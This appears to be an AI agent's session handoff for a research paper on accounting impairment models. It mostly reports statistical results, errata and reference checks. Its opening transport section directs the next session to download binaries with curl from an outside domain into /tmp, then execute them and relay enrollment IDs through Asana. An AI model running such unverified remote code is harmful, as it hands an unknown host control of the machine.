---
project: wealth-tensor
gh_sha: cc1d19885c64d525bd6dcc238d03dc2399f2bb57
updated: 2026-08-12
session: wealthTensor-14
gate_passed: true
gate_version: "2.50"
---

# wealth-tensor — HANDOFF

*Overwritten every session. `git log -p docs/HANDOFF.md` is the archive. Run
`python3 scripts/handoff_gate.py --check` before trusting this file.*

## 0 · TRANSPORT — darlish, zero-bridge

```
curl -s https://system.europeanflorist.com/dsh/darlish-up -o /tmp/darlish-up && chmod +x /tmp/darlish-up && /tmp/darlish-up
```

Post the printed `DARLISH-ENROLL v1 id=… fp=…` line **exactly** as a comment on Asana task
`1217316841710435` via the session's Asana MCP, then run `/tmp/darlish-up` again to collect.
**Re-run before diagnosing.** *First collect has worked in `-06` through `-14` without exception.*
Cycle ~4 min; `-14` was READY inside two minutes and the bridge rotated zero times all session.

```
curl -s https://system.europeanflorist.com/dsh/dx -o /tmp/dx && chmod +x /tmp/dx
/tmp/dx '~/Scripts/roster join --who big-wealthTensor-15 --task "<what you are doing>"'
/tmp/dx '~/Scripts/roster claim --who big-wealthTensor-15 --resource wealth-tensor'
```

`export LESSONS_CONTRIBUTOR=opus` **before any `lessons.py add`** — without it a leaf can reach
`active` but never `trusted`.

**Never inline a multi-line commit message in a `dx '...'` argument.** Write it to a file, `--put`
it, `git commit -F`. Used six times this session, no incidents. `printf '%s\n' ...` into a local
file then `--put` is the cheapest form.

`dx --get` fails on binary — base64 both ways. Quote remote paths. Give long `dx` calls five
minutes. Exit 3 = never reached darwin, safe to re-run; exit 4 = started, check state first.

**Known noise, already carded — do not debug it.** Every commit in a claimed repo prints
`ROSTER CONTENTION — wealth-tensor is ALSO claimed by: big-wealthTensor-14`, naming *you*. The
commit hook identifies the session from `DARLISH_SESSION` (the transport id, `cloud-XXXX`) while
`roster join --who` records the name you chose, so one session occupies two rows and contends with
itself. Diagnosed and filed on **State Machine `1217420907841952`** with three candidate fixes.
`~/Scripts` was claimed by a live sibling, which is why it is teed up rather than fixed.

### The editing tool that makes this project cheap — use it

Do **not** edit the manuscript with `sed`, heredocs, or in-place regex. Write a Python patch script
locally, `--put` it, run it. Every edit is an exact-string replacement that **counts its anchor and
exits non-zero if the count is not 1**:

```python
def sub(label, old, new):
    global src
    if src.count(old) != 1:
        print(f"ANCHOR FAIL [{label}]: {src.count(old)} matches"); sys.exit(1)
    src = src.replace(old, new); edits.append(label)
```

Twelve edit sites across two manuscript patches this session, **zero anchor failures** — because of
the one habit `-13` paid two round trips to learn and this session followed: the manuscript is
hard-wrapped at ~100 columns, so **`sed` the region to a local file and copy the wrapping out of
it** rather than composing an anchor from memory.

**The trap that DID cost two round trips here, and it is new.** `severity.check()` **executes its
witness immediately**. A witness lambda referencing a helper defined *later* in the file raises
`NameError` at the check, not at import — so the script dies halfway through a run that has already
printed twenty seconds of results. **Define every helper a witness touches ABOVE the first check
that uses it.** Hit twice, ten minutes each.

## 1 · WHAT HAPPENED — §4.4's HEADLINE WAS CARRYING AN ASSUMPTION, AND SO WAS §4.5's

`REG-002` registered and pushed before a line of the instrument existed;
`scripts/wt088_disclosed_ladder.py` — **14 severe · 0 definitional · 0 vacuous**; 124 tests green
(was 121); coach ratchet unchanged at **6**.

§4.4 said *the ranking does not merely blur, it inverts.* Both figures behind it — Kendall τ = −1
at the tabulated ladder, 1.9% recovery over 4,000 ladders — were computed under **two** constraints
imposed jointly: observability falls up the ladder (the design), and durability rises up it (an
inference from the standards' *scheduling* behaviour). **Drop the second and mean τ goes −0.414 →
+0.318.** Not weakened. Reversed.

**So dispersion and ordering do different damage, and the paper had them fused.** δ dispersion
*destroys* the ranking — recovery falls from 100.0% at a common δ to 11.5% with no ordering at all.
The ordering is what turns the wreckage into a *reversal* — 23.8% against 1.1%. §4.4 now claims the
region and reports the corner.

**The corner is a knife edge in its own top rung.** Goodwill and indefinite-lived intangibles cross
in closed form at **δ₃\* = Kα/(1 + K) = 0.00789** — an eighty-seven-period half-life, verified
against bisection to 1 × 10⁻⁹. The table assigns 0.002.

**And "unscheduled" read as "slow" errs twice in the same direction.** At an *identical mean rate*
(δ = 0.20 with probability 0.05) realised deferral is **1.303×** the closed form at that mean
(se 0.002, 2,000 paths) — a δ-equivalent of 0.0123, **above the crossing.** Measured, not argued
from the convexity of δ/(α − δ).

**The disclosed-numbers repair the at-bat asked for does not land where anyone expected.** ASC 360
and ASC 350-30-50 disclose useful lives, so δ for two rungs needs no inference — but **R exists only
for δ < α, and at α = 0.05 the entire disclosed rectangle is outside the model's domain.** Every
useful life short enough to appear in a filing implies a decay rate at or above the recognition
rate. Half the rectangle is admissible only at α ≈ 0.19, all of it above α = 0.33. Asked at an α
where the question has a domain, the first rung **rises in 99.7%** of the rectangle: the table is
wrong at its first step on published numbers.

**A fitted design rule somebody else can use.** With *budget* = mean per-rung Δlog(1 − φ) and
*δ leverage* = mean per-rung |Δlog δ − Δlog(α − δ)|, P(the design fails) is logistic in
log(leverage/budget), slope **+1.58** (se 0.081, z = +19.5; permuted-outcome witness z = **0.23**),
crossing one half at **0.61**. The tabulated ladder sits at **2.58**.

**§4.5's survivor does not survive it either.** The lag ordering holds in 100% of 400 ladders drawn
under the same two constraints; unordered it is **66.2%** (M = 2,000, se 0.011), 3.55 se below the
0.70 threshold registered blind. The concession is **narrowed, not withdrawn** — lag is still better
by a factor of six against the magnitude measure's 11.5%.

## 2 · TWO REGISTERED FALSIFIERS WERE THEMSELVES WRONG, AND THAT IS THE REUSABLE PART

Recorded as errata in `REG-002` §5 and `RESULT-REG-002.md`, never rewritten.

**E1's threshold was stated on |mean τ|.** An absolute value **cannot distinguish an effect that
vanished from one that changed sign.** Measured +0.318 against a ±0.10 band, so the registered test
*as literally written* returns "the inversion survives" — the exact opposite of what the number
says. The symmetric band **feels** conservative because it looks like it guards both directions; it
is the one shape blind to the most interesting outcome a directional hypothesis has.

**E4's threshold was a share of a set that turned out to be empty.** Not passed, not failed —
reporting "does not fire" would have been a phantom tag at section scale. And **E6, registered as a
boundary check on a corner of the parameter space, is not a corner: it is where the disclosed
numbers all live.**

**The generalisation, and it is the mirror image of WT-052.** That rule covers a check appended
*after* the numbers arrive. This is a check specified so that **no number can address it.** A
falsifier can fail two ways before it ever runs, and both are visible at registration time for one
sentence each:

> **Which outcomes does this threshold fail to separate?**
> **Is the set I am taking a share of guaranteed non-empty?**

Both banked globally, with the pole-horizon numerics leaf, in `claude-blackbook` (pushed).

## 3 · THE PAPERS

**Paper III** — `docs/papers/paper-III-dual-tensor/paper-III.md`, **2,137 lines** (was 2,075). Prior
version at `paper-III.md.bak-pre-wt088`. Numbering preserved; nothing renumbered.

| § | what changed |
|---|---|
| 4.4 | **heading and closing third replaced** — "The design has a validity region, and the disclosed numbers fall outside it". Dispersion/ordering separated; the fitted boundary; the crossing rate; the lumpy result; the disclosed-life boundary; the domain restriction |
| 4.5 | the 100% figure now carries its unordered companion (66.2% vs 11.5%); the concession narrowed, not withdrawn |
| 4.2 | **Bellman & Åström narrowed** to the transfer-function definition — nothing readable in that source supports the unordered-pair statement in their mouths. The pole-set consequence is now drawn in the paper's own voice, where it can be checked |
| — | abstract, contribution 3, and **six new rows** in the §7 survivals ledger |

**Net defensive prose is DOWN.** The ten-line "the ladder is an assumption" paragraph is gone,
replaced by five positive results with numbers in their own units, and a §4.5 clause narrating the
paper's own draft history was deleted (charter §3.3). **The ratchet is unchanged at 6 — the
additions were paid for by the deletions**, which is the mechanism charter §7 asks for.

**Three tests §4.4 needed and did not have** (`tests/test_lag.py`): the crossing-rate closed form
against bisection; the first-rung boundary at six rates rather than the published one; the domain
restriction. **Writing the third found what the run had not:** convergence to the closed form
**slows without bound as δ → α** — at δ = 0.045 the 400-period ratio is still 11% short of its own
limit. Past the pole growth is exactly log((1 − α)/(1 − δ)) per period, pinned only just past it:
by δ = 0.100 the ratio hits 10⁹⁴ by period 4,000 and a longer check measures float64's exponent
range rather than the model.

## 4 · THE REFERENCE WORK — ONE ATTRIBUTION NARROWED BEFORE A REFEREE COULD NARROW IT

Both `-13`'s remaining abstract-level items were run down in parallel with the writing.

**Garrett (1994) — HELD, and it is stronger than the entry claimed.** *J. Pharmacokinetics and
Biopharmaceutics* 22(2), 103–128, DOI 10.1007/BF02353538, confirmed against Springer, Crossref,
OpenAlex and PubMed. **Its abstract states flip-flop verbatim** — *"'Flip-flop,' the interchange of
the values of the evaluated rate constants, occurs when ke > 3ka"* — so the §4.2 citation rests on
read text. **Bibliography trap:** in 1994 the journal was *Journal of Pharmacokinetics and
Biopharmaceutics*; Springer's own page displays the post-2001 name *…and Pharmacodynamics*. The
manuscript has the 1994 name and must keep it. No free full text; not open access.

**Bellman & Åström (1970) — the attribution was too strong and is FIXED.** *Mathematical
Biosciences* 7(3–4), 329–339, DOI 10.1016/0025-5564(70)90132-X, confirmed against Crossref,
OpenAlex and Lund's institutional record. **Nothing readable supports putting the unordered-pair
statement in their mouths** — the paper is paywalled and every accessible description, including
Lund's own abstract, covers the *definition* of structural identifiability and the transfer-function
criterion. Six citing sources checked; none describes them treating root exchange. §4.2 now cites
them for what they demonstrably do and draws the pole-set consequence itself. **Same animal as the
Kuan adjective, one costume over: a source credited with a consequence of its method rather than
with its method.** *(Issue number: Crossref and OpenAlex say 7(3–4); several reference lists say
7(3) or omit it. 7(3–4) is what the structured metadata supports.)*

**Still on disk in `~/Desktop/downloads/journals/`, still unread:** `ryan1995.pdf` + its erratum
(§4.5 and §9 both lean on Ryan's accrual model) and `zhu2016.pdf` (Wei Zhu, *Accruals and price
crashes*, RAST 2016), uncited — decide whether §9 wants it. Run `provenance_check.py` on anything
new. **Grep the bibliography by SURNAME before adding a reference** — `-13` found two entries for
one paper, one a phantom.

## 5 · THE AT-BAT, RANKED

1. **THE OFF-DIAGONAL PAPER** (Paper III's Limitation 9). Now unambiguously the largest unclaimed
   thing in the corpus, and `-14` did not touch it. Co-occurrence of impairments across classes
   against an independence null: no observability proxy, no φ-to-GAAP bridge, no new data — the
   **688 events already collected are enough**. **Register before coding the instrument (WT-052)**,
   and read `REG-002` §5's errata first: this session's two registration defects are both shapes an
   independence-null registration can repeat.
2. **THE RECOGNITION RATE IS NOW THE OPEN EMPIRICAL QUESTION, AND §4.4 SAYS SO IN PRINT.** `-14`
   closed §4.4 by establishing that the deferral measure exists only where α > δ and that **no
   disclosed useful life short enough to appear in a filing satisfies that at α = 0.05.** The
   paper's α was never estimated; it was calibrated. Half the disclosed rectangle needs α ≈ 0.19 and
   all of it α > 0.33. **What is α empirically?** It is the rate at which a deferred loss is
   recognised, and the registered 688-event sample plausibly prices it — time from an unrecognised
   gap opening to a charge. This is the natural sequel to §4.4 and it is now load-bearing for the
   section's own domain sentence rather than optional.
3. **Take the σ-and-lifetime result to the data** (`-13`'s item 2, untouched). §4.7 says
   identification strength is a property of the asset. Rank the four GAAP classes by realised return
   volatility and asset life; the registered sample can price it. No new data. Nobody has run it.
   **Note the interaction with item 2:** the same sample serves both, so run them together.
4. **Finish the bibliography** — §4 above. Two PDFs on disk, then Garrett/Bellman are DONE.

## 6 · WHAT NOT TO DO

- **Do not restore the neat sentence.** *"PRE-001 was doomed by the φδ confound"* is false; `wt082`,
  `wt083`, the survivals ledger and now `wt088` E7 all assert its negation. **E7 narrowed the
  MARGIN of the lag statistic's survival; it did not restore that claim.** 66.2% against 11.5% is
  still a factor of six.
- **Do not re-claim the mathematics.** Bateman/flip-flop is conceded in §4.2 on purpose; Nerlove
  stands beside it. A session that "strengthens" the paper by removing a concession undoes the most
  valuable thing `-12` and `-13` did.
- **Do not restore "global rather than local identifiability" to the Kuan citation**, and **do not
  restore the unordered-pair statement to Bellman and Åström.** Both are the wrong claim in
  somebody's mouth; the second was fixed this session.
- **Do not reopen Griliches (1967).** Closed with evidence.
- **Do not hand Jason a ranked list of problems as a deliverable** (WT-079). **Do not run a pure
  teardown** (WT-078).
- **Do not invoke Mayo, severity or error-statistical philosophy as a *warrant*.** Pragmatic
  justification.
- **Do not ask him to submit anything.** **Never add a free parameter to absorb an objection.**
- **Do not rewrite or summarise the charter inside a handoff.** Read it; it is binding.
- **Do not polish §4.4.** It has now been rewritten whole twice. The next session that touches it
  should be running item 2 or reading a reference.

## 7 · THINGS THAT WILL BITE YOU, FIXED OR CARDED HERE SO THEY DO NOT

1. **The coach ratchet counts the BIBLIOGRAPHY** and everything outside §§6–11. A reference entry
   that narrates its own correction moves it and is a blocker. State what the source says. **Adding
   a section means deleting narration elsewhere, not refreshing `docs/.coach-baseline.json`** — this
   session added ~60 lines to §4.4 and stayed at 6 by deleting one conduct clause from §4.5.
2. **`gate-selfcheck.sh`'s two long-standing failures are CLEARED.** `-13` reported an uncommitted
   `HANDOFF-floristAlix-2.md` and a `card-lint` stale reference and correctly left both alone — a
   sibling was mid-wrap. That session has since ended with no roster row, so `-14` adopted the
   orphan: the file is committed with an **additive** footer naming its successor cards, and card
   `1217398339377049` carries a reconcile comment. **Gate now reads PASS.** If it fails for you,
   the failure is new and probably yours — check `roster who` first, and say whose it was.
3. **`severity.check()` executes its witness immediately.** See §0.
4. **A registered falsifier is worth one minute of adversarial reading before it is pushed.** See
   §2. This session's two defects each cost more to report honestly than they would have cost to
   prevent.

## 8 · DEFINITION OF DONE

Three pre-prints posted. Paper III is closest. **§4 is finished work and §4.4 is now closed as an
argument too** — theorem, proof, ancestry, both degeneracies, both repairs, the price of each, an
honest account of which cases are hard, and, after `wt088`, an explicit validity region with a
computable boundary and a stated domain. The structural queue is empty.

**What remains on Paper III is empirical and bibliographic, not argumentative.** Item 2 is the one
that changed status this session: §4.4 now makes a claim in print — that the measure exists only
where α > δ — whose empirical content nobody has established. That is no longer optional polish; it
is the section's own open question, and the registered sample can answer it.

## 9 · ORIENT-THEN-GO

Emit one line — `Oriented: <state> · at-bat: <X> · opening with <first action>.` — then start
writing. Don't wait for the go, and ask for a ruling when you need one.

*The question was whether §4.4's inversion survives being built on published numbers. It does not
survive being built on anything: the ordering it rested on was doing all the work, and when you go
looking for the numbers to replace that ordering, they turn out to live outside the model's domain
entirely. The section is better for it — it now hands the reader a boundary instead of a table.* ⚒️
